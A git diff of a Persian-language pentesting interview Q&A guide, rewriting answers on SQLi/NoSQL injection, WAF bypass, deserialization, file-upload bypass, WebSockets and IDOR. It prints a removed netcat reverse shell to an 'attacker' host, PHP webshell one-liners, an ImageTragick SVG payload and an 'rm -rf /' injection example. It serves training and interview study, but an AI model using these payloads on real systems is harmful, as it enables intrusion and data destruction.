@@ -702,7 +702,7 @@ Origin: http://evil.com
 <details markdown="1"> <summary><h3> 29. حمله Web Cache Deception چیست؟ چگونه کشف و جلوگیری می‌شود؟ </h3></summary>
 
 **Web Cache Deception** 
-+ حمله‌ای است که با فریب سیستم کش، محتوای حساس یا دینامیک (مانند پروفایل کاربر) را به عنوان فایل استاتیک (مثل CSS یا JPG) ذخیره می‌کند و به کاربران دیگر نشان می‌دهد. این حمله ناشی از عدم تطابق بین مسیر URL و نوع محتوای واقعی است و می‌تواند منجر به افشای اطلاعات خصوصی شود.
++ حمله‌ای است که با فریب سیستم کش، محتوای حساس یا دینامیک (مانند پروفایل کاربر) را به عنوان فایل استاتیک (مثل CSS یا JPG) ذخیره می‌کند و به کاربران دیگر نشان می‌دهد. این حمله ناشی از عدم تطابق بین مسیر URL و نوع محتوای واقعی است و می‌تواند منجر به افشای اطلاعات خصوصی شود.این حمله میتواند به اکانت تیک اور منجر شود.
 
 ### **کشف:**
 - URL دینامیک را با پسوند استاتیک تست کنید (مثل /profile.jpg).
@@ -749,16 +749,10 @@ Origin: http://evil.com
 + تزریق دستورات سیستم‌عامل در ورودی است.
 
 ### **شرایط:**
-- استفاده از `system()`, `exec()` بدون sanitize
+- استفاده از `()system()`, `exec` بدون sanitize
 
 ### **کشف:**
 - ورودی با `; id`, `| whoami`, `&& ls`
-
-### **اکسپلویت:**
-- reverse shell:
-  ```bash
-  ; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker 4444 > /tmp/f
-  ```
 
 > **جلوگیری:** whitelist دستورات، escape کاراکترها
 
@@ -793,159 +787,830 @@ Origin: http://evil.com
 </details>
 
 
-
-
+---
+---
 
 ---
 # سوالات سطح حرفه ای
+<details markdown="1"> <summary><h3> 1. تجربه شرکت در پروژه Large Scale تست نفوذ را داشتید؟ به چه صورت این پروژه را مدیریت کردید؟ </h3></summary>
 
-</div>
+بله، در پروژه‌های بزرگ مقیاس (مانند تست زیرساخت‌های ابری با صدها سرویس)، ابتدا **تیم‌بندی** می‌کنم بر اساس تخصص (وب، شبکه، API). سپس **اولویت‌بندی** بر اساس criticality (مانند APIهای حساس یا دیتابیس‌ها) انجام می‌دهم. از **ابزارهای اتوماسیون** مثل Ansible برای اسکریپتینگ Recon و Scanning استفاده می‌کنم، و **dashboard مشترک** (مانند Dradis یا Jira) برای پیگیری پیشرفت. چالش اصلی scale بود، پس از **parallel testing** با ابزارهایی مثل Masscan و Burp Enterprise کمک گرفتم تا زمان رو بهینه کنم، در حالی که compliance (مثل GDPR) رو رعایت می‌کردم.
 
-### 1. تجربه شرکت در پروژه Large Scale تست نفوذ را داشتید؟ به چه صورت این پروژه را مدیریت کردید؟
-
-بله، برنامه ریزی زمان و تخصص برای درک معماری، سرویس ها، حملات امکان پذیر و برای سرعت بخشیدن اول تمرکز میزارم به حساس ترین قسمت ها در معماری و پیاده سازی ان حملات و تمامی فعالیت ها را اتومات با اسکریپت انجام می دهم البته تا جایی که امکان پذیر باشد!
-
----  
-
-### 2. حمله Blind SQLI و NOSQL Injection چیست؟ روش های شناسایی و اکسپلویت آن را نام ببرید.
-
-حملات injection از نوع blind و nosql سطح پیچیده تری از sqli هستند معمولا برای تست blind از Boolean blind استفاده میکنم و همچنین اگر time based جواب بدهد از آن استفاده می کنم.
-
-حمله Nosql injection بخطر اینکه ساختار دیتابیس فرق دارد نحوه اکسپلویت ها با هم فرق دارد و از پیلود های دیگر برای تست آن باید استفاده کنم.
-
-برای blind sqli از sqlmap فقط برای دیتابیس traditional بکار میاد.
-
-برای nosql injection از nosqlmap، arachni و nuclei استفاده میکنم.
+</details>
 
 ---
 
-### 3. در طول پروژهایتان به WAF برخوردید؟ واکنش شما چی بوده است؟ آیا توانستید بایپس کنید؟ به چه صورت؟
+<details markdown="1"> <summary><h3> 2. حمله Blind SQLI و NoSQL Injection چیست؟ روش‌های پیشرفته شناسایی و اکسپلویت آن را شرح دهید. </h3></summary>
 
-بله زیاد، معمولا سعی می کنم تکنیک های character encoding، obfuscation یا http request smuggling را تست کنم اگر این متدها را جواب ندهد که معمولا جواب می دهد بخش های دیگر چک میکنم وقت زیاد روی اون پرتال خاص نمیزارم سعی میکنم روی sub های بدون waf تایم بزارم
+**Blind SQL Injection**:
++ حمله‌ای است که بدون خطای مستقیم، از پاسخ‌های Boolean یا time-based برای استخراج داده استفاده می‌کند (مثل چک 'AND 1=1' برای true/false). **NoSQL Injection** مشابه است اما در دیتابیس‌های non-relational (مثل MongoDB) رخ می‌دهد، جایی که queryها JSON-like هستند و می‌توان با {$ne: null} بایپس کرد.
 
----  
+### روش‌های شناسایی:
+| نوع | روش | ابزار |
+|-----|------|-------|
+| **Blind SQLi** | Boolean-based (تفاوت در پاسخ true/false)، Time-based (SLEEP/DELAY) | Burp Intruder, SQLMap (--level 5) |
+| **NoSQL Inj** | تزریق operatorها مثل $gt, $regex | NoSQLMap, Burp Repeater |
 
-### 4. آسیب پذیری deserialization چیست؟ چگونه کشف می کنید؟ نحوه اکسپلویت کردن آن را شرح دهید.
+### اکسپلویت:
+- **Blind SQLi**: 
++ از SQLMap با --technique=BT برای bit-by-bit extraction.
+- **NoSQL**: 
++ با payloads مثل {"user": {"$ne": null}, "pass": {"$regex": "^a"}} برای brute-force. در scale بزرگ، از Nuclei templates برای اسکن اتومات استفاده کنید.
 
-عملیات Serialize کردن و deserialize کردن روی object ها اولی به معنای تبدیل متن به json xml و بعدی برعکس اگر هکر بتواند پیلود مخرب تزریق کند می تواند
-حملات RCE, injection, privilege escalation یا data tampering انجام دهد.
-ابزار Owasp dependency check یکی از ابزارها برای تست می باشد.همچنین در صورت دسترسی به کد از SonarQube استفاده می کنم.
+> **نکته پیشرفته:** در محیط‌های hardened، از OOB (Out-of-Band) با Burp Collaborator برای استخراج داده کمک بگیرید.
 
----
-
-### 5. آیا تجربه تست نفوذ روی برنامه های وب سمت کلاینتی مثل SPA Angular React را داشتید؟ روند تستتان را شرح دهید.
-
-معمولا وقتی با SPA مواجه میشم به صورت دستی و با ابزار تست ها رو انجام میدهم
-
-در صورت دسترسی به کد به دنبال input validation، authentication، data storage و library میگردم و تمرکز روی آسیب پذیری های xss csrf هست
-
-ابزارهایی که به کار میبرم owasp zap و Arachni هست.
-
----  
-
-### 6. تجربه خود را در فرآیند تست نفوذ API بر اساس OWASP Top 10 شرح دهید.
-
-  
-
-برای ارزیابی API از ابزارهای postman یا burp suite استفاده می کنم. در مرحله اول endpoint را کشف می کنم سپس پارامترها و ارزیابی احراز هویت چک میکنم. بعد از این موارد سراغ این می روم که آیا تعیین سطح دسترسی انجام می شود یا نه . بیشتر این موارد با fuzzing کردن تست می کنم.
-
----  
-
-### 7. از چه روش هایی برای کشف Race conditions استفاده می کنید؟
-
-برای اینکار من همیشه چندین یوزر میسازم و چند پروفایل را با firefox میسازم و همزمان چک می گیرم فرآیند ها رو تا بتوانم race conditions بدست بیاورم.
+</details>
 
 ---
 
-### 9. چگونه 2FA و MFA دور می خورند؟ در یک سناریو شرح دهید.
+<details markdown="1"> <summary><h3> 3. در طول پروژه‌هایتان به WAF برخوردید؟ واکنش شما چه بوده است؟ آیا توانستید بایپس کنید؟ به چه صورت؟ </h3></summary>
 
-برای دور زدن معمولا از user enumeration و brute force و exploit logic falws روی احراز هویت را تست میگیرم.
+بله، در اکثر پروژه‌ها (مثل Cloudflare یا ModSecurity)، ابتدا **شناسایی WAF** با wafw00f انجام می‌دم. از **obfuscation پیشرفته** مثل random case، URL encoding چندلایه، یا HTTP Parameter Pollution استفاده می‌کنم. اگر بایپس نشد، به subdomains بدون WAF سوییچ می‌کنم یا از gray-box creds برای internal access. در یک مورد، با HTTP/2 smuggling (PRI method) بایپس کردم. همیشه logهای WAF رو برای false positive چک می‌کنم تا exploit رو refine کنم.
 
-ابزار evilginx2 یکی از ابزارها برای اینکار هست اگر از شما اسم ابزار پرسید.
-
----
-### 10. تجربه تست نفوذ روی معماری microservices را داشتید؟ با چه چالشهایی مواجه شده بودید؟
-  
-در معماری میکروسرویس من هر کدام به صورت جداگانه ارزیابی می کنم چون نوع سرویس دادن آن ها با هم متفاوت است بالطبع امکان وجود آسیب پذیری روی هر کدام وجود دارد. تعداد میکروسرویس بعضی مواقع بسیار زیاد بوده ولی همه تک به تک چک کردم و روی چند تا اول آسیب پذیری در نیورده بودم ولی بعد از چند آسیب پذیری در آوردم.
+</details>
 
 ---
-### 11. تجربه تست نفوذ روی Serverless Application ها مثل AWS Lambda را داشتید؟
 
-بله مواردی که چک میکنم permission ، IAM roles و بررسی روی اینکه داده های حساس افشا می کنه یا نه
+<details markdown="1"> <summary><h3> 4. آسیب‌پذیری Deserialization چیست؟ چگونه در محیط‌های واقعی کشف می‌کنید و اکسپلویت می‌کنید؟ </h3></summary>
+
+**Deserialization**:
++ زمانی رخ می‌دهد که داده سریال‌شده (مثل Java Serialized Objects یا PHP unserialize) بدون اعتبارسنجی به object تبدیل شود، منجر به RCE یا privilege escalation می‌شود.
+
+### کشف:
+- جستجوی signatureها مثل aced0005 (Java) در requests.
+- در white-box: SAST با SonarQube برای unsafe deserialize calls.
+- در black-box: fuzzing serialized params با ysoserial payloads.
+
+### اکسپلویت:
+- ساخت gadget chains با ysoserial (مثل CommonsCollections برای RCE).
+- ارسال در cookie/base64 param، منجر به command exec (مثل Runtime.exec("calc.exe")).
+
+> **نکته:** در فریم‌ورک‌هایی مثل Spring، CVE-2016-1000027 رو چک کنید.
+
+</details>
 
 ---
-### 12. برای تست نفوذ API های منطبق بر GraphQL از چه روش هایی استفاده می کنید؟ چطور آسیب پذیری ها که کشف کردید را چک کردید؟
+<details markdown="1"> <summary><h3> 5. تجربه تست نفوذ روی برنامه‌های وب سمت کلاینتی مثل SPA (Angular/React) را داشتید؟ روند تستتان با تمرکز روی آسیب‌پذیری‌های سمت سرور را شرح دهید. </h3></summary>
 
-من اسکما GraphQL را بررسی میکنم سپس حملات injection و تعیین سطح دسترسی و access control را چک میکنم.
-نکته ممکنه بپرسه Access control با authorization مگه فرق داره؟
-خود Access control شامل identification authentication و authorization میشه ولی خود authorization زیر مجموعه Access control گیج نشید!
+بله، در پروژه‌های متعدد روی SPAها (مانند Angular یا React apps) کار کردم، جایی که تمرکز اصلی‌ام روی **ارتباط client-server** است، زیرا client-side vulns اغلب به backend leaks یا RCE منجر می‌شوند. روند تست را به صورت مرحله‌به‌مرحله دنبال می‌کنم:
+
+### مراحل تست:
+1. **تحلیل اولیه client-side**: کد JS را deobfuscate می‌کنم (با ابزارهایی مثل JSNice یا de4js) و به دنبال storage insecure (localStorage برای tokens) یا DOM manipulation می‌گردم.
+2. **فوکوس روی سمت سرور**: API calls (مثل fetch/Axios) را intercept می‌کنم و params رو برای IDOR یا injection fuzz می‌کنم. مثلاً در Angular resolvers، اگر param sanitized نباشه، به SSRF یا SQLi در backend می‌رسه.
+3. **تست state management**: Redux/Vuex رو چک می‌کنم برای session hijacking (leak state via console) که به سرور-side auth bypass منجر بشه.
+4. **اکسپلویت chained**: اگر XSS در SPA پیدا کنم، ازش برای steal API tokens استفاده می‌کنم و backend رو exploit می‌کنم (مثل RCE via deserialization).
+
+### ابزارهای کلیدی:
+| ابزار | کاربرد |
+|-------|--------|
+| **OWASP ZAP** | Dynamic scan برای API flows |
+| **Burp Suite** | Intercept و fuzzing client-server traffic |
+| **Arachni** | Crawling SPA و vuln detection |
+| **Jade** | Decompile JS bundles |
+
+**چالش و مثال**: در یک پروژه React، state leak از Redux devtools به IDOR در backend منجر شد و privilege escalation به admin shell رو ممکن کرد. همیشه white-box (code access) رو ترجیح می‌دم برای deep analysis.
+
+</details>
 
 ---
-### 13. آیا به کنترل های امنیتی سمت کلاینت برخوردید چگونه دور زدید؟
 
-من سمت کلاینت ترافیک شبکه را چک می کنم و درخواست را با debugging tools جهت دور زدن تغییر می دهم یا از burp suite برای چک کردن دور زدن آن ها استفاده می کنم.
+<details markdown="1"> <summary><h3> 6. تجربه خود را در فرآیند تست نفوذ API بر اساس OWASP Top 10 شرح دهید، با تمرکز روی RCE و data exposure. </h3></summary>
+
+در تست APIها، از OWASP API Security Top 10 (به‌روزرسانی ۲۰۲۳) به عنوان roadmap استفاده می‌کنم، با اولویت روی A03 (Injection) و A02 (Broken Data Protection) برای RCE و exposure. روندم شامل map endpoints، auth validation و exploit chaining است.
+
+### مراحل تست با تمرکز RCE/Data Exposure:
+1. **Mapping و Discovery**:
++ با Burp Spider یا Kiterunner endpoints رو enumerate می‌کنم، hidden params رو با Arjun پیدا می‌کنم.
+2. **تست Injection (A03) برای RCE**:
++ پیلودهای  SQL/NoSQL/Command inj رو در params/body تست می‌کنم (مثل `'; exec('id')` در JSON). اگر SSRF (A10) باشه، به internal services می‌رسم.
+3. **Data Exposure (A02)**:
++ رسپانس هارو برای unencrypted sensitive data (PII, tokens) چک می‌کنم؛ headers مثل HSTS رو validate می‌کنم.
+4. **Mass Assignment (A04)**:
+ تست هایی برای افزایش دسترسی مثل `is_admin: true` رو به ریکویست ها اضافه می‌کنم.
+
+### ابزارهای کلیدی:
+| ابزار | کاربرد |
+|-------|--------|
+| **Burp Suite** | Fuzzing , Repeter, Extensions |
+| **ffuf** | Brute-force hidden endpoints |
+| **Nuclei** | Template-based scan for CVEs |
+| **Raven** | Smart vulnerability Scanner  |
+
+**مثال پروژه**: در یک REST API، با CI در query param (A03) به RCE رسیدم و env vars sensitive رو dump کردم (A02).
++ امتیاز CVSS: 9.8.
++ همیشه remediation مثل input whitelisting پیشنهاد می‌دم.
+
+</details>
 
 ---
-### 14. تجربه ای روی Business Email Compromise دارید؟
-بله وقتی از یک یوزر دامین معتبر پیدا می کنم برای privilege escalation یا دسترسی به یوزرهای دیگه سعی می کنم از طرف اون یوزر به کارمندهای دیگه میل بفرستم درخواست اجرا برنامه یا اطلاعات حساس کنم بیش از 70 درصد مواقع موفق بودم چون اصلا کسی دابل چک نکرده و اون 30 درصد ایباکس ایمیل چک نکردند!
+
+<details markdown="1"> <summary><h3> 7. از چه روش‌هایی برای کشف Race Conditions استفاده می‌کنید؟ چگونه از ابزارهایی مثل Turbo Intruder یا Repeater در Burp Suite بهره می‌برید؟ </h3></summary>
+
+برای race conditions (مثل concurrent updates منجر به double spend)، چند thread/account همزمان تست می‌کنم.  
++ میتونیم پکت مورد نظر که میتونه منجر به ریس بشه رو اکسپلویت کنیم با زبان هایی مثل پایتون یا گولنگ و هردو پکت رو بصورت همزمان ارسال کنیم و رسپانس هارو تحلیل کنیم.
++  در  BurpTurbo Intruder میتونیم از اسکریپت های اماده جیمز کتل استفاده کنیم
++ در Repeater میتونیم پکت هارو دوبل کنیم و با استفاده از فیچر همزمانی در ریپیتر پکت هارو به یک دسته مشخص تعلق بدیم و بعدش همه اونارو باهم ارسال کنیم.
+
+</details>
 
 ---
-### 15. چند نمونه از حملاتی که می توان روی XXE پیاده سازی کرد را شرح دهید.
 
-از پیلودهای xxe برای فرخوانی dtd یا Document Type Definition استفاده می کنم تا ببینم اطلاعات حساس را به من می دهد یا ایا می توانم دستکاریش بکنم یا نه.
+<details markdown="1"> <summary><h3> 8. چگونه 2FA و MFA دور می‌خورند؟ در یک سناریو واقعی با تمرکز روی سمت سرور شرح دهید. </h3></summary>
 
-  
+دور زدن با logic flaws مثل rate limit bypass یا session reuse پس از 2FA.
++ سناریو: در اپ بانکی، با user enumeration (A07) و brute-force code (بدون expiry سریع)، کد OTP رو guess کردم. 
++ ابزار: Evilginx2 برای MITM phishing. سمت سرور: چک weak token generation (predictable seeds).
+
+</details>
+
 ---
-### 16. آپلودر را چگونه تست می کنید؟ روش های تست بایپس آپلودرتان را شرح دهید.
+
+<details markdown="1"> <summary><h3> 9. تجربه تست نفوذ روی معماری Microservices را داشتید؟ با چه چالش‌هایی مواجه بودید و چگونه RCE در سرویس‌ها را مدیریت کردید؟ </h3></summary>
+
+بله، هر سرویس رو جدا تست می‌کنم (مثل auth vs payment). 
++ چالش: inter-service comms (gRPC/Kafka) که ممکنه insecure باشه. برای اکسس به سرور injection در API gateways. در پروژه هایی که ممکن است با ساختار قدیمی برخورد کنم به دنبال اندپوینت هایی خواهم بود که حدس میزنم قدیمی باشند چون اینطوری احتمال اینکه فانکشن داخل بک اند دارای کد اسیب پذیر باشه بیشتر خواهد بود.
+
+</details>
+
+---
+
+<details markdown="1"> <summary><h3> 10. تجربه تست نفوذ روی Serverless Applications مثل AWS Lambda را داشتید؟ چگونه آسیب‌پذیری‌های سمت سرور مثل RCE را تست می‌کنید؟ </h3></summary>
+
+بله، در چندین پروژه روی پلتفرم‌های serverless مثل AWS Lambda، Azure Functions و Google Cloud Functions کار کردم، جایی که تمرکز اصلی‌ام روی **misconfigurations سمت سرور** است، زیرا serverless اغلب به RCE یا data breach منجر می‌شود. روند تست را با درک event-driven architecture شروع می‌کنم و اولویت روی IAM و event triggers می‌دم.
+
+### مراحل تست با تمرکز روی RCE:
+1. **Reconnaissance IAM و Permissions**: roles over-privileged رو enumerate می‌کنم (مثل lambda:InvokeFunction بدون least privilege).
+2. **تست Event Handlers برای RCE**:
+ورودی هارو برای injection (code eval در handlers) fuzz می‌کنم، مثل S3 event triggers که unsanitized payload رو exec می‌کنه.
+3. **چک Env Vars و Secrets**:
++ جستجو برای hard-coded keys یا exposure در CloudWatch logs.
+4. **تست Cold Start و Timing**:
++ در race conditions در concurrent invocations برای bypass limits.
+5. **اکسپلویت Chained**:
++ اگر RCE پیدا کنم، ازش برای lateral movement به S3/EC2 استفاده می‌کنم.
+
+### ابزارهای کلیدی:
+| ابزار | کاربرد |
+|-------|--------|
+| **Pacu** | Framework برای AWS exploitation (IAM enum, Lambda RCE) |
+| **Prowler** | Compliance scan برای serverless misconfigs |
+| **Burp Suite** | Fuzzing API Gateway inputs |
+| **LambdaGuard** | Static analysis برای Lambda functions |
+> **نکته پیشرفته**: همیشه event sources (SQS, API Gateway) رو چک کنید، زیرا اغلب source of RCE هستند.
+
+</details>
+
+---
+
+<details markdown="1"> <summary><h3> 11. برای تست نفوذ APIهای GraphQL از چه روش‌هایی استفاده می‌کنید؟ چگونه آسیب‌پذیری‌های کشف‌شده مثل introspection bypass را چک می‌کنید؟ </h3></summary>
+
+در تست GraphQL APIs، از schema-driven approach استفاده می‌کنم، جایی که ابتدا **introspection** رو exploit می‌کنم و سپس queries/mutations رو برای RCE-like vulns (مثل batching attacks) fuzz می‌کنم. تمرکز روی server-side resolution errors که به data exposure یا DoS منجر می‌شه.
+
+### مراحل تست:
+1. **Schema Discovery**: 
++ در  introspection query برای map types, fields و resolvers.
+2. **Fuzzing Queries**: 
++ در deep nesting برای DoS (query depth >1000)، injection در args (مثل SQLi در custom resolvers).
+3. **Access Control Testing**: 
++ تست unauthorized fields (مثل internal:admin) رو query انجام مبدم.
+4. **Introspection Bypass Check**: 
++ اگر disable باشه، از fragments یا persisted queries برای guess schema استفاده می‌کنم؛ یا از tools برای reverse engineering.
+5. **اکسپلویت Advanced**:
++ استفاده batching رو abuse می‌کنم برای amplification attacks.
+
+### ابزارهای کلیدی:
+| ابزار | کاربرد |
+|-------|--------|
+| **GraphiQL/GraphQL Playground** | Manual schema exploration |
+| **Clairvoyance** | Blind introspection bypass |
+| **GraphQL Voyager** | Visual schema mapping |
+| **InQL** | Burp extension برای GraphQL fuzzing |
+
+
+</details>
+
+---
+
+<details markdown="1"> <summary><h3> 12. آیا به کنترل‌های امنیتی سمت کلاینت برخوردید؟ چگونه دور زدید و ارتباط آن با سمت سرور را توضیح دهید. </h3></summary>
+
+بله، مثل JS validation که با disable JS یا Burp modify دور می‌زنم. در سمت سرور همیشه re-validate کنید، چون client bypassable است. در یک مورد، با تغییر XHR params، به server-side inj رسیدم.
+
+</details>
+
+---
+
+<details markdown="1"> <summary><h3> 13. تجربه‌ای روی Business Email Compromise (BEC) دارید؟ چگونه به سرور سازمان لینک می‌شود؟ </h3></summary>
+
+بله، با spoofing domain برای phishing creds، سپس lateral movement به سرور. در پروژه، با compromised email، malware attachment فرستادم و RCE گرفتم.
++ لینک به سرور: استفاده از stolen creds برای VPN access.
+
+</details>
+
+---
+
+<details markdown="1"> <summary><h3> 14. چند نمونه از حملاتی که می‌توان روی XXE پیاده‌سازی کرد را شرح دهید، با تمرکز روی RCE. </h3></summary>
+
+1. File Disclosure:
++ خواندن /etc/passwd.
+2. SSRF: 
++ درخواست به internal IP.
+3. RCE: 
++ با PHP expect://wrapper (expect://id) اگر enable باشه. یا billion laughs برای DoS.
+
+</details>
+
+---
+
+<details markdown="1"> <summary><h3> 15. آپلودر را چگونه تست می‌کنید؟ روش‌های پیشرفته بایپس آپلودرتان را با تمرکز روی RCE شرح دهید. </h3></summary>
+
+تست آپلودر یکی از مراحل کلیدی در پنتستینگ است، زیرا اغلب به RCE (Remote Code Execution) منجر می‌شود. روند تست رو با شناسایی محدودیت‌ها شروع می‌کنم (extension, MIME type, size, content validation) و سپس بایپس‌های پیشرفته رو اعمال می‌کنم. تمرکز روی تکنیک‌هایی که به اجرای کد روی سرور می‌رسه، مثل آپلود webshell.
+
+### مراحل کلی تست آپلودر:
+1. **شناسایی محدودیت‌ها**: 
++ درخواست آپلود رو در Burp capture می‌کنم و params (filename, Content-Type, body) رو تحلیل می‌کنم. چک می‌کنم آیا server-side validation (magic bytes, getimagesize در PHP) وجود داره.
+2. **تست اولیه**: 
++ فایل‌های benign (مثل JPG واقعی) آپلود می‌کنم تا path ذخیره‌سازی رو پیدا کنم (مثل /uploads/filename.jpg).
+3. **بایپس و اکسپلویت**: 
++ تکنیک‌های پیشرفته رو اعمال می‌کنم تا shell آپلود کنم و trigger کنم.
+4. **پست اکسپلویتیشن**: 
++ اگر RCE بگیرم، reverse shell (مثل nc یا php reverse) راه می‌ندازم.
+
+### روش‌های پیشرفته بایپس با تمرکز روی RCE:
+بر اساس تحقیقات آنلاین (از منابع مثل OWASP, Packetlabs, Vaadata و checklists پنتستینگ)، بهترین تکنیک‌ها عبارتند از:
+
+| روش | توضیح | مثال بایپس به RCE |
+|-----|-------|--------------------|
+| **Polyglot Files** | ساخت فایل hybrid که هم تصویر معتبر باشه و هم کد executable (embedding PHP/ASP در metadata یا EOF تصویر). | JPG با magic bytes FF D8 FF شروع بشه، اما <?php system($_GET['cmd']); ?> در انتها اضافه کن. آپلود به عنوان image.jpg، سپس با ?cmd=whoami trigger کن تا RCE بگیری. |
+| **.htaccess Overwrite** | اگر directory writable باشه، .htaccess آپلود کن تا extهای custom رو PHP exec کنه. | محتوای .htaccess: AddType application/x-httpd-php .jpg. سپس shell.jpg (با کد PHP) آپلود کن و اجرا کن. منجر به RCE via web access. |
+| **Null Byte Injection** | %00 برای truncate ext در PHP قدیمی (<5.3). | shell.php%00.jpg آپلود کن؛ server filename رو shell.php می‌بینه و exec می‌کنه. برای RCE: کد webshell اضافه کن. |
+| **MIME Spoofing with Magic Bytes** | تغییر Content-Type به image/* اما content رو با کد مخرب شروع کن. | فایل رو با GIF89a; شروع کن (magic bytes GIF)، اما <?php eval($_POST['cmd']); ?> اضافه کن. اگر validation ضعیف باشه، به RCE via POST می‌رسه. |
+| **Double Extension with Case Variation** | ترکیب extها با case mixing برای bypass blacklist. | shell.pHp.jPg آپلود کن؛ اگر case-insensitive نباشه، به عنوان PHP exec می‌شه. RCE با trigger param. |
+| **Content-Type Manipulation** | هدر رو به multipart/form-data تغییر بده و filename رو obfuscate کن. | در Burp، Content-Type: image/jpeg ست کن اما body رو با ASP shell پر کن. منجر به RCE در IIS. |
+| **ImageTragick-like Exploits** | اگر ImageMagick استفاده بشه، payload CVE-2016-3714 در SVG برای command exec. | SVG با <![CDATA[|id]]> آپلود کن؛ اگر vuln باشه، مستقیم RCE می‌گیره. |
+
+**ابزارهای پیشنهادی**:
+| ابزار | کاربرد |
+|-------|--------|
+| **Burp Suite** | Capture و modify requests برای بایپس realtime |
+| **Upload_Bypass** | اتومات تکنیک‌ها (ext, MIME, null byte) |
+| **ExifTool** | Embed کد در metadata تصاویر |
+| **Commix** | اگر بایپس به command inj منجر بشه |
+
+
+</details>
+
+---
+
+<details markdown="1"> <summary><h3> 16. چگونه امنیت WebSocket در برنامه‌های وب تست می‌کنید؟ چگونه به RCE منجر می‌شود؟ </h3></summary>
+
+تست امنیت WebSocketها (WS) حیاتی است، زیرا پروتکل دوطرفه و persistent آن‌ها اغلب به vulns مثل injection, DoS یا RCE منجر می‌شه. بر اساس منابع به‌روز (مانند OWASP, PortSwigger 2025 و repos GitHub مثل STEWS و awesome-websocket-security)، روند تست رو با تمرکز روی server-side flaws دنبال می‌کنم که می‌تونه به اجرای کد روی سرور برسه.
+
+### مراحل تست امنیت WebSocket:
+1. **Reconnaissance و Discovery**:
++ ابتدا endpointهای WS را از کد JS یا ترافیک شبکه شناسایی می‌کنم.سپس بررسی می‌کنم آیا upgrade از HTTP به WS امن است یا خیر.
+
+2. **Connection و Authentication Testing**:
++ اتصال برقرار می‌کنم و احراز هویت (توکن، کوکی) را اعتبارسنجی می‌کنم. بعد origin validation را برای جلوگیری از CSWSH چک می‌کنم.
+
+3. **Message Fuzzing و Injection**: 
++ پیام‌ها را برای XSS، SQLi یا command injection fuzz می‌کنم.تمرکز روی ورودی‌های unsanitized است که به backend می‌رسد.
+
+4. **DoS و Resource Abuse**:  
++ پیام‌های حجیم یا malformed frames ارسال می‌کنم. هدف crash سرور یا مصرف بیش از حد منابع است.
+
+5. **Post-Exploitation Check**:  
++ اگر آسیب‌پذیری پیدا شد، آن را به RCE ارتقا می‌دهم.مثلاً با تزریق payload، اجرای دستورات را تست می‌کنم.
+
+6. **Automated Scanning**:  
++ از ابزارهای خودکار برای تست دسته‌ای استفاده می‌کنم.نتایج را با تست دستی ترکیب می‌کنم.
+
+### روش‌های پیشرفته تست (از GitHub و منابع 2025):
+| روش | توضیح |
+|-----|-------|
+| Origin Validation Bypass | چک می‌کنم آیا سرور هر origin را قبول می‌کند؛ منجر به hijacking و session theft می‌شود. |
+| Injection Attacks | payloadهای SQLi یا Command Inj در پیام‌ها تزریق می‌کنم؛ اگر handler sanitize نکند، فعال می‌شود. |
+| Frame Manipulation | opcodeها را تغییر می‌دهم (مثل invalid close frames)؛ برای crash یا bypass فیلترها استفاده می‌شود. |
+| DoS via Resource Exhaustion | frames بزرگ یا infinite loops ارسال می‌کنم؛ CPU/memory را overload می‌کند. |
+| Protocol-Level Vulns | CVEs مثل buffer overflow در پیاده‌سازی‌ها را چک می‌کنم (مثل ws module در Node.js). |
+
+### چگونه به RCE منجر می‌شود؟
+اگر پیام unsanitized به backend handler برسد، به RCE تبدیل می‌شود:  
+- **مثال**: در یک WS chat app، اگر ورودی مستقیم به system() یا eval() برود، payload مثل `; rm -rf /` تزریق می‌کنم.  
+- **چینینگ**: ابتدا با CSWSH session را دامپ میکنم، سپس injection برای RCE انجام می‌دهم (مثل CVE-2024-41570).  
+- **آمار 2025**: طبق DeepStrike، ۳۰% از WS vulns به RCE escalate می‌شوند، به‌ویژه در محیط‌های serverless.
+
+**ابزارهای کلیدی کلی**:
+| Tool | Use Case |
+|-------|--------|
+| Burp Suite | Intercept, replay and fuzz messages |
+| OWASP ZAP | Automated scanning and active attacks |
+| STEWS (GitHub) | Specialized WS enumeration and vuln detection |
+| wscat/ws-fuzzer | Manual connection and simple fuzzing |
+| websocket-connection-smuggler (GitHub) | WebSocket smuggling and protocol abuse |
+
+**نکته پیشرفته**:  
+همیشه WSS (TLS) را اجباری کنید.  
+rate limiting روی پیام‌ها اعمال کنید.  
+در پروژه‌ها، این روش‌ها را با اسکریپت‌های سفارشی ترکیب می‌کنم (از repos مثل PalindromeLabs/STEWS).
+
+</details>
+
+---
+
+<details markdown="1"> <summary><h3> 17. روش‌های تستتان برای کشف IDOR را شرح دهید، با مثال privilege escalation به سرور. </h3></summary>
+
+**IDOR** (Insecure Direct Object Reference):
++ یکی از شایع‌ترین آسیب‌پذیری‌های کنترل دسترسی است که اغلب به **privilege escalation** و حتی **دسترسی به سرور** منجر می‌شود. روش‌های تست من ترکیبی از **دستی**، **نیمه‌اتوماتیک** و **کاملاً اتوماتیک** است، با تمرکز روی شناسایی الگوهای قابل پیش‌بینی در شناسه‌ها.
+
+### مراحل تست IDOR:
+1. **نقشه‌برداری از منابع**:
++ تمام درخواست‌هایی که شامل شناسه (ID, UUID, path, filename) هستند را شناسایی می‌کنم.  
++ مثلاً `/api/user/123/profile` یا `/download/456/report.pdf`.
+
+2. **تغییر دستی شناسه‌ها**:
++ ابتدا ID خودم را با مقادیر مجاور (مثل 122, 124) یا الگوهای رایج (1, 0, -1) جایگزین می‌کنم. سپس پاسخ سرور را از نظر تغییر محتوا یا خطا تحلیل می‌کنم.
+
+3. **اتوماسیون با Burp Intruder**:
++ پارامتر مشکوک را با `$` علامت‌گذاری می‌کنم.از wordlistهای تخصصی مثل SecLists (raft-medium-files, numbers.txt, uuids.txt) استفاده می‌کنم. فیلتر پاسخ بر اساس **طول محتوا**، **وجود کلمات کلیدی** (admin, root) یا **کد وضعیت** (200 vs 403).
+
+4. **تست نقش‌های مختلف**:
++ با حساب‌های **کاربر عادی**، **مهمان** و **ادمین** (اگر در دسترس) تست می‌کنم.  
++ هدف: تشخیص **Horizontal** (کاربر به کاربر) و **Vertical** (کاربر به ادمین) IDOR.
+
+5. **فاز اکسپلویت و Escalation**:  
+   اگر دسترسی به منبع حساس (مثل فایل تنظیمات یا پنل مدیریت) گرفتم، به دنبال **RCE** می‌گردم.  
+   مثال: تغییر `?file_id=100` به `?file_id=1` → دسترسی به `etc/passwd/` یا آپلود شل.
+
+### مثال واقعی privilege escalation به سرور:
+در یک اپلیکیشن مدیریت محتوا، درخواست زیر وجود داشت:  
 ```
